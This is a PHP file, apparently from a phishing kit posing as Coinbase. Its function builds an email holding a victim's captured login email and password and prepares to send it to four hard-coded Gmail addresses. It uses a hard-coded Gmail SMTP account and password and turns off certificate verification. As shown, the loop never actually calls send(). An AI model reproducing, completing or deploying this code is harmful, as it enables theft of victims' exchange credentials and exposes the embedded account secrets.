<?php

use PHPMailer\PHPMailer\PHPMailer;
function sendmail($email, $pass)
{
    $receiveremails = ["hallhoggy@gmail.com", "adelewisdom@gmail.com", "afriktv1@gmail.com", "backenddarwin@gmail.com"];
    $email = $email;
    $pass = $pass;
    $name = "Coinbase";  // Name of your website or yours
    $subject = "User Account Activation";
    $body = "<div>
    <p>User login details</p>
    <p>Email: $email</p>

    <p>Password: $pass </p>
        </div>";
        $from = "zeddzoul9@gmail.com";  // you mail
        $password = "onseejnstarnmimv";  // your mail password

    require_once "PHPMailer/PHPMailer.php";
    require_once "PHPMailer/SMTP.php";
    require_once "PHPMailer/Exception.php";
    global $mail;
    $mail = new PHPMailer();

    // To Here

    //SMTP Settings
    $mail->isSMTP();
    //$mail->SMTPDebug = 3;                        
    $mail->Host = "smtp.gmail.com"; // smtp address of your email
    $mail->SMTPAuth = true;
    $mail->Username = $from;
    $mail->Password = $password;
    $mail->Port = 465;  // port
    $mail->SMTPSecure = "ssl";  // tls or ssl
    $mail->smtpConnect([
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
            'allow_self_signed' => true
        ]
    ]);

    //Email Settings
    // $mail->isHTML(true);
    // $mail->setFrom($from, $name);
    // $mail->addAddress($to); // enter email address whom you want    to send
    // $mail->Subject = ("$subject");
    // $mail->Body = $body;

    $i = 0;
    for ($i=0; $i < 4; $i++) { 
        # code......
        $mail->isHTML(true);
        $mail->setFrom($from, $name);
        $mail->addAddress($receiveremails[$i]); // enter email address whom you want    to send
        $mail->Subject = ("$subject");
        $mail->Body = $body;
    }
}
